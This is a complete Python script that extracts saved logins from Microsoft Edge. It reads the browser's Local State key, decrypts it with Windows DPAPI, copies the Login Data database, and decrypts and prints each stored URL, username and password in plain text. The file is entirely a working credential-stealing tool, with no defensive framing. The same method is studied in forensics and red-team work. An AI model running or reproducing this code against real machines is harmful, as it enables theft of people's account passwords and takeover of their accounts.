import os
import json
import base64
import sqlite3
import shutil
import win32crypt
from Crypto.Cipher import AES

# 1. Paths
local_state_path = os.path.expandvars(r'%LOCALAPPDATA%\Microsoft\Edge\User Data\Local State')
login_db_path = os.path.expandvars(r'%LOCALAPPDATA%\Microsoft\Edge\User Data\Default\Login Data')
tmp_copy_path = os.path.expanduser('~\\AppData\\Local\\Temp\\edge_login_copy.db')

# 2. Get AES Key
def get_aes_key():
    with open(local_state_path, 'r', encoding='utf-8') as f:
        local_state = json.load(f)
    encrypted_key_b64 = local_state['os_crypt']['encrypted_key']
    encrypted_key = base64.b64decode(encrypted_key_b64)[5:]  # Strip 'DPAPI'
    aes_key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
    return aes_key

# 3. Decrypt password
def decrypt_password(encrypted, key):
    try:
        if encrypted[:3] == b'v10':
            iv = encrypted[3:15]
            payload = encrypted[15:-16]
            tag = encrypted[-16:]
            cipher = AES.new(key, AES.MODE_GCM, iv)
            decrypted = cipher.decrypt_and_verify(payload, tag)
            return decrypted.decode()
        else:
            return win32crypt.CryptUnprotectData(encrypted, None, None, None, 0)[1].decode()
    except Exception as e:
        return f"[Decryption failed: {e}]"

# 4. Extract and decrypt
def extract_edge_passwords():
    aes_key = get_aes_key()
    shutil.copy2(login_db_path, tmp_copy_path)  # Copy to avoid lock
    conn = sqlite3.connect(tmp_copy_path)
    cursor = conn.cursor()

    cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
    for row in cursor.fetchall():
        url, username, enc_password = row
        password = decrypt_password(enc_password, aes_key)
        print(f"[+] URL: {url}\n    Username: {username}\n    Password: {password}\n")
    cursor.close()
    conn.close()
    os.remove(tmp_copy_path)

# Run
extract_edge_passwords()